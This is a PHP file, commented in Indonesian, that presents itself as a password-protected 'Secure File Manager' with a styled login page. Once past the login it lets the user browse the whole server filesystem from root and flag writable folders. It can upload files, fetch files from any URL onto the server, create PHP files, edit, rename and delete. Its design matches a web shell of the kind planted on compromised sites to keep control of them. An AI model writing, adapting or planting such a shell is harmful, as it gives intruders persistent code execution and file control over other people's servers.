<?php
// ==========================================
// KONFIGURASI KEAMANAN
// ==========================================

// Password default: admin123
$password_hash = '$2a$12$QLh7xqC2/49495gjTzGumeqQ12HatXJrvxnntoUW2kmFrUfCxVWdK';

// ==========================================
// KONFIGURASI TAMPILAN
// ==========================================

// URL gambar dari Blogger
$background_url = 'https://i.pinimg.com/originals/2e/bd/06/2ebd06b4dde55598cff5b33550511c78.gif';

// Nama/judul login
$login_title = 'Secure File Manager';
$login_subtitle = 'Masukkan password untuk melanjutkan';

session_start();

// Proses Login
if (isset($_POST['login_pass'])) {
    if (password_verify($_POST['login_pass'], $password_hash)) {
        $_SESSION['fm_auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error_msg = "Password salah!";
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Cek Sesi Autentikasi
if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title><?= htmlspecialchars($login_title) ?></title>

    <style>
        * {
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            margin: 0;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #fff;

            display: flex;
            justify-content: center;
            align-items: center;

            position: relative;
            overflow: hidden;

            background:
                linear-gradient(
                    rgba(0, 0, 0, 0.60),
                    rgba(0, 0, 0, 0.75)
                ),
                url('<?= htmlspecialchars($background_url, ENT_QUOTES, 'UTF-8') ?>');

            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        /* Efek blur background */
        body::before {
            content: "";
            position: fixed;
            inset: -20px;

            background:
                url('<?= htmlspecialchars($background_url, ENT_QUOTES, 'UTF-8') ?>')
                center / cover no-repeat;

            filter: blur(10px);
            transform: scale(1.08);

            z-index: -2;
        }

        /* Overlay */
        body::after {
            content: "";
            position: fixed;
            inset: 0;

            background:
                radial-gradient(
                    circle at center,
                    rgba(0, 0, 0, 0.20),
                    rgba(0, 0, 0, 0.78)
                );

            z-index: -1;
        }

        /* Card Login */
        .card {
            width: 360px;
            max-width: calc(100% - 30px);

            padding: 38px 32px;

            text-align: center;

            background: rgba(15, 23, 42, 0.72);

            border: 1px solid rgba(255, 255, 255, 0.15);

            border-radius: 20px;

            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);

            box-shadow:
                0 25px 60px rgba(0, 0, 0, 0.55),
                inset 0 1px 0 rgba(255, 255, 255, 0.08);

            animation: cardIn .7s ease;
        }

        @keyframes cardIn {
            from {
                opacity: 0;
                transform: translateY(25px) scale(.96);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* Icon */
        .icon {
            width: 70px;
            height: 70px;

            margin: 0 auto 18px;

            display: flex;
            justify-content: center;
            align-items: center;

            border-radius: 50%;

            font-size: 30px;

            background: rgba(56, 189, 248, 0.12);

            border: 1px solid rgba(56, 189, 248, 0.35);

            box-shadow:
                0 0 30px rgba(56, 189, 248, 0.18);
        }

        .card h2 {
            margin: 0;

            font-size: 24px;
            font-weight: 600;

            color: #fff;
        }

        .subtitle {
            margin-top: 8px;
            margin-bottom: 25px;

            color: rgba(255, 255, 255, 0.60);

            font-size: 13px;
        }

        /* Input */
        .input-group {
            position: relative;
            margin-bottom: 15px;
        }

        input[type="password"] {
            width: 100%;

            padding: 14px 15px;

            background: rgba(0, 0, 0, 0.28);

            border: 1px solid rgba(255, 255, 255, 0.16);

            color: #fff;

            border-radius: 10px;

            outline: none;

            font-size: 14px;

            transition: .25s;
        }

        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.40);
        }

        input[type="password"]:focus {
            border-color: rgba(56, 189, 248, 0.8);

            background: rgba(0, 0, 0, 0.40);

            box-shadow:
                0 0 0 3px rgba(56, 189, 248, 0.10);
        }

        /* Button */
        button {
            width: 100%;

            padding: 14px;

            border: none;
            border-radius: 10px;

            cursor: pointer;

            color: #fff;

            font-size: 14px;
            font-weight: 600;

            background: linear-gradient(
                135deg,
                #0284c7,
                #2563eb
            );

            box-shadow:
                0 8px 25px rgba(37, 99, 235, 0.25);

            transition: .25s;
        }

        button:hover {
            transform: translateY(-2px);

            box-shadow:
                0 12px 30px rgba(37, 99, 235, 0.40);
        }

        button:active {
            transform: translateY(0);
        }

        /* Error */
        .err {
            color: #fecaca;

            font-size: 13px;

            margin-bottom: 15px;

            padding: 10px 12px;

            border-radius: 8px;

            background: rgba(239, 68, 68, 0.12);

            border: 1px solid rgba(239, 68, 68, 0.25);
        }

        /* Footer */
        .footer {
            margin-top: 22px;

            font-size: 11px;

            color: rgba(255, 255, 255, 0.35);
        }

        @media (max-width: 480px) {
            .card {
                padding: 32px 24px;
            }
        }
    </style>
</head>

<body>

    <div class="card">

        <div class="icon">
            🔐
        </div>

        <h2>
            <?= htmlspecialchars($login_title) ?>
        </h2>

        <div class="subtitle">
            <?= htmlspecialchars($login_subtitle) ?>
        </div>

        <?php if (isset($error_msg)): ?>
            <div class="err">
                <?= htmlspecialchars($error_msg) ?>
            </div>
        <?php endif; ?>

        <form method="POST">

            <div class="input-group">
                <input
                    type="password"
                    name="login_pass"
                    placeholder="Masukkan Password..."
                    required
                    autofocus
                    autocomplete="current-password"
                >
            </div>

            <button type="submit">
                Akses Dashboard
            </button>

        </form>

        <div class="footer">
            Secure File Manager
        </div>

    </div>

</body>
</html>
    <?php
    exit;
}

// ==========================================
// LOGIKA DIREKTORI & BERKAS
// ==========================================
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$dir = realpath($dir) ? realpath($dir) : realpath('.');

$msg = '';
$msg_type = 'info';

// 1. Download File Lokal
if (isset($_GET['download'])) {
    $file_download = $dir . DIRECTORY_SEPARATOR . basename($_GET['download']);
    if (is_file($file_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_download) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_download));
        readfile($file_download);
        exit;
    }
}

// 2. Fitur Wget (Download dari URL Luar)
if (isset($_POST['wget_url']) && !empty($_POST['wget_url'])) {
    $url = trim($_POST['wget_url']);
    $filename = basename(parse_url($url, PHP_URL_PATH));
    if (empty($filename)) {
        $filename = 'downloaded_file_' . time();
    }
    $target_wget = $dir . DIRECTORY_SEPARATOR . $filename;
    
    // Menggunakan cURL atau file_get_contents yang aman
    $content = @file_get_contents($url);
    if ($content !== false) {
        if (file_put_contents($target_wget, $content) !== false) {
            $msg = "Berhasil mengunduh file via URL: " . htmlspecialchars($filename);
            $msg_type = 'success';
        } else {
            $msg = "Gagal menyimpan file ke direktori.";
            $msg_type = 'error';
        }
    } else {
        $msg = "Gagal mengambil data dari URL (Periksa koneksi atau izin URL fopen).";
        $msg_type = 'error';
    }
}

// 3. Upload File Biasa
if (isset($_FILES['upload_file'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $msg = "File berhasil diunggah.";
        $msg_type = 'success';
    } else {
        $msg = "Gagal mengunggah file.";
        $msg_type = 'error';
    }
}

// 4. Buat Folder Baru
if (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
    $new_path = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']);
    if (!file_exists($new_path)) {
        mkdir($new_path, 0755, true);
        $msg = "Folder berhasil dibuat.";
        $msg_type = 'success';
    } else {
        $msg = "Folder sudah ada.";
        $msg_type = 'error';
    }
}

// 5. Buat File Baru
if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
    $new_file_path = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_file']);
    if (!file_exists($new_file_path)) {
        file_put_contents($new_file_path, '');
        $msg = "File baru berhasil dibuat.";
        $msg_type = 'success';
    } else {
        $msg = "File sudah ada.";
        $msg_type = 'error';
    }
}

// 6. Rename Item
if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old_p = $dir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $new_p = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (file_exists($old_p) && !file_exists($new_p)) {
        rename($old_p, $new_p);
        $msg = "Nama item berhasil diubah.";
        $msg_type = 'success';
    } else {
        $msg = "Gagal mengubah nama item.";
        $msg_type = 'error';
    }
}

// 7. Hapus Item
if (isset($_GET['delete'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (is_file($target)) {
        unlink($target);
        $msg = "File berhasil dihapus.";
        $msg_type = 'success';
    } elseif (is_dir($target)) {
        @rmdir($target);
        $msg = "Folder berhasil dihapus.";
        $msg_type = 'success';
    }
}

// 8. Simpan Edit File
if (isset($_POST['save_file_content']) && isset($_POST['edit_file_name'])) {
    $file_target = $dir . DIRECTORY_SEPARATOR . basename($_POST['edit_file_name']);
    if (is_file($file_target)) {
        file_put_contents($file_target, $_POST['save_file_content']);
        $msg = "Perubahan file berhasil disimpan.";
        $msg_type = 'success';
    }
}

// Ambil dan Pisahkan Folder & File (Agar Folder di Atas)
$search = isset($_GET['q']) ? $_GET['q'] : '';
$raw_items = scandir($dir);
$folders = [];
$files = [];

if ($raw_items) {
    foreach ($raw_items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        // Filter pencarian jika ada
        if ($search !== '' && stripos($item, $search) === false) continue;
        
        $item_path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($item_path)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
}
// Urutkan alfabet
sort($folders);
sort($files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Dark File Manager Pro v3</title>
    <style>
        :root {
            --bg-main: #0f172a;
            --bg-card: #1e293b;
            --bg-hover: #334155;
            --border-color: #334155;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent-blue: #38bdf8;
            --accent-green: #4ade80;
            --accent-red: #f87171;
        }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg-main); color: var(--text-main); margin: 0; padding: 20px; }
        .container { max-width: 1250px; margin: 0 auto; background: var(--bg-card); border-radius: 12px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--border-color); }
        .top-bar { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; margin-bottom: 20px; }
        .top-bar h2 { margin: 0; color: var(--accent-blue); font-size: 20px; }
        
        /* Breadcrumb Style */
        .breadcrumb { background: #0f172a; padding: 12px 15px; border-radius: 6px; font-family: monospace; word-break: break-all; margin-bottom: 20px; border: 1px solid var(--border-color); font-size: 14px; }
        .breadcrumb a { color: var(--accent-blue); text-decoration: none; font-weight: 600; }
        .breadcrumb a:hover { text-decoration: underline; }
        
        .controls { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 25px; background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); }
        .controls form { display: flex; gap: 8px; align-items: center; }
        input[type="text"], input[type="file"] { padding: 8px 12px; background: #1e293b; border: 1px solid var(--border-color); color: #fff; border-radius: 6px; font-size: 13px; outline: none; }
        input[type="text"]:focus { border-color: var(--accent-blue); }
        input[type="file"] { color: var(--text-muted); cursor: pointer; }
        
        .btn { padding: 8px 14px; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 5px; transition: opacity 0.2s; }
        .btn:hover { opacity: 0.85; }
        .btn-blue { background: #0284c7; color: #fff; }
        .btn-green { background: #16a34a; color: #fff; }
        .btn-red { background: #dc2626; color: #fff; }
        .btn-gray { background: #475569; color: #fff; }
        
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-size: 14px; }
        th { background: #0f172a; color: var(--text-muted); font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
        tr:hover { background: var(--bg-hover); }
        
        .alert { padding: 12px 18px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: 500; }
        .alert-success { background: rgba(74, 222, 128, 0.15); color: var(--accent-green); border: 1px solid rgba(74, 222, 128, 0.3); }
        .alert-error { background: rgba(248, 113, 113, 0.15); color: var(--accent-red); border: 1px solid rgba(248, 113, 113, 0.3); }
        textarea { width: 100%; height: 450px; font-family: 'Fira Code', Consolas, monospace; background: #0f172a; color: #38bdf8; padding: 15px; border: 1px solid var(--border-color); border-radius: 6px; box-sizing: border-box; font-size: 14px; line-height: 1.5; outline: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="top-bar">
        <h2>⚡ Dark File Manager Pro v3</h2>
        <a href="?logout=1" class="btn btn-red">Keluar (Logout)</a>
    </div>

    <!-- BREADCRUMB DIREKTORI KLIKABLE -->
    <div class="breadcrumb">
        <strong>Direktori: </strong>
        <?php
        $path_parts = explode(DIRECTORY_SEPARATOR, $dir);
        $accumulator = '';
        foreach ($path_parts as $index => $part) {
            if ($part === '') {
                $accumulator = '/';
                echo '<a href="?dir=%2F">root</a>/';
                continue;
            }
            $accumulator .= ($accumulator === '/') ? $part : DIRECTORY_SEPARATOR . $part;
            echo '<a href="?dir=' . urlencode($accumulator) . '">' . htmlspecialchars($part) . '</a>/';
        }
        ?>
    </div>

    <?php if ($msg): ?>
        <div class="alert alert-<?= $msg_type ?>"><?= htmlspecialchars($msg) ?></div>
    <?php endif; ?>

    <!-- INTERFACE EDIT FILE -->
    <?php if (isset($_GET['edit'])): 
        $edit_target = $dir . DIRECTORY_SEPARATOR . basename($_GET['edit']);
        if (is_file($edit_target)):
            $content = file_get_contents($edit_target);
    ?>
        <h3 style="color: var(--accent-blue);">📝 Mengedit Berkas: <?= htmlspecialchars($_GET['edit']) ?></h3>
        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
            <input type="hidden" name="edit_file_name" value="<?= htmlspecialchars($_GET['edit']) ?>">
            <textarea name="save_file_content"><?= htmlspecialchars($content) ?></textarea><br><br>
            <button type="submit" class="btn btn-green">💾 Simpan Perubahan</button>
            <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-gray">❌ Batal</a>
        </form>
    <?php exit; endif; endif; ?>

    <!-- PANEL KONTROL & AKSI (Termasuk Wget) -->
    <div class="controls">
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upload_file" required>
            <button type="submit" class="btn btn-blue">Upload</button>
        </form>

        <form method="POST">
            <input type="text" name="new_folder" placeholder="Folder baru..." required>
            <button type="submit" class="btn btn-green">+ Folder</button>
        </form>

        <form method="POST">
            <input type="text" name="new_file" placeholder="File.php/txt..." required>
            <button type="submit" class="btn btn-green">+ File</button>
        </form>

        <!-- Fitur Wget / Download URL -->
        <form method="POST">
            <input type="text" name="wget_url" placeholder="https://... (Wget URL)" required style="width: 180px;">
            <button type="submit" class="btn btn-blue">Wget URL</button>
        </form>

        <form method="GET" style="margin-left: auto;">
            <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
            <input type="text" name="q" placeholder="Cari..." value="<?= htmlspecialchars($search) ?>">
            <button type="submit" class="btn btn-gray">Cari</button>
        </form>
    </div>

    <!-- TABEL DAFTAR BERKAS (FOLDER DI ATAS, FILE DI BAWAH) -->
    <table>
        <thead>
            <tr>
                <th>Nama Berkas / Folder</th>
                <th>Ukuran</th>
                <th>Terakhir Dimodifikasi</th>
                <th style="text-align: right;">Aksi Kontrol</th>
            </tr>
        </thead>
<tbody>
            <?php if (dirname($dir) !== $dir): ?>
            <tr>
                <td colspan="4">
                    <a href="?dir=<?= urlencode(dirname($dir)) ?>" style="text-decoration:none; color: var(--accent-blue); font-weight: 600;">
                        📁 [..] Naik satu tingkat
                    </a>
                </td>
            </tr>
            <?php endif; ?>

            <!-- FOLDER -->
            <?php foreach ($folders as $folder): 
                $folder_path = $dir . DIRECTORY_SEPARATOR . $folder;
                $mtime = date("Y-m-d H:i", filemtime($folder_path));
                $can_write = is_writable($folder_path); // Cek permission
            ?>
            <tr style="border-left: 5px solid <?= $can_write ? '#4ade80' : '#f87171' ?>;">
                <td>
                    📁 <a href="?dir=<?= urlencode($folder_path) ?>" style="text-decoration:none; color: <?= $can_write ? 'var(--accent-blue)' : '#f87171' ?>; font-weight: 600;"><?= htmlspecialchars($folder) ?></a>
                </td>
                <td style="color: var(--text-muted);">-</td>
                <td style="color: var(--text-muted);"><?= $mtime ?></td>
                <td style="text-align: right;">
                    <button onclick="renameItem('<?= htmlspecialchars($folder) ?>')" class="btn btn-gray" style="padding:4px 8px; font-size:11px;">Rename</button>
                    <a href="?dir=<?= urlencode($dir) ?>&delete=<?= urlencode($folder) ?>" onclick="return confirm('Yakin ingin menghapus folder ini?')" class="btn btn-red" style="padding:4px 8px; font-size:11px;">Hapus</a>
                </td>
            </tr>
            <?php endforeach; ?>

            <!-- FILE -->
            <?php foreach ($files as $file): 
                $file_path = $dir . DIRECTORY_SEPARATOR . $file;
                $can_write = is_writable($file_path); // Cek permission
                $bytes = filesize($file_path);
                // ... (logic hitung ukuran file sama seperti sebelumnya) ...
                $size = ($bytes >= 1048576) ? number_format($bytes / 1048576, 2) . ' MB' : (($bytes >= 1024) ? number_format($bytes / 1024, 2) . ' KB' : $bytes . ' Bytes');
                $mtime = date("Y-m-d H:i", filemtime($file_path));
            ?>
            <tr style="border-left: 5px solid <?= $can_write ? '#4ade80' : '#f87171' ?>;">
                <td>
                    <span style="color: <?= $can_write ? 'var(--text-main)' : '#f87171' ?>;">
                        📄 <?= htmlspecialchars($file) ?> <?= !$can_write ? ' 🔒' : '' ?>
                    </span>
                </td>
                <td style="color: var(--text-muted);"><?= $size ?></td>
                <td style="color: var(--text-muted);"><?= $mtime ?></td>
                <td style="text-align: right;">
                    <?php if ($can_write): ?>
                        <a href="?dir=<?= urlencode($dir) ?>&edit=<?= urlencode($file) ?>" class="btn btn-blue" style="padding:4px 8px; font-size:11px;">Edit</a>
                    <?php else: ?>
                        <span class="btn" style="padding:4px 8px; font-size:11px; background:#334155; color:#94a3b8; cursor:not-allowed;">Locked</span>
                    <?php endif; ?>
                    
                    <a href="?dir=<?= urlencode($dir) ?>&download=<?= urlencode($file) ?>" class="btn btn-gray" style="padding:4px 8px; font-size:11px;">Download</a>
                    <button onclick="renameItem('<?= htmlspecialchars($file) ?>')" class="btn btn-gray" style="padding:4px 8px; font-size:11px;">Rename</button>
                    <a href="?dir=<?= urlencode($dir) ?>&delete=<?= urlencode($file) ?>" onclick="return confirm('Yakin ingin menghapus file ini?')" class="btn btn-red" style="padding:4px 8px; font-size:11px;">Hapus</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

<!-- Form Tersembunyi untuk Proses Rename -->
<form id="rename-form" method="POST" style="display:none;">
    <input type="hidden" name="old_name" id="old_name">
    <input type="hidden" name="new_name" id="new_name">
</form>

<script>
function renameItem(oldName) {
    var newName = prompt("Ubah nama untuk: " + oldName, oldName);
    if (newName && newName !== oldName) {
        document.getElementById('old_name').value = oldName;
        document.getElementById('new_name').value = newName;
        document.getElementById('rename-form').submit();
    }
}
</script>

</body>
</html>
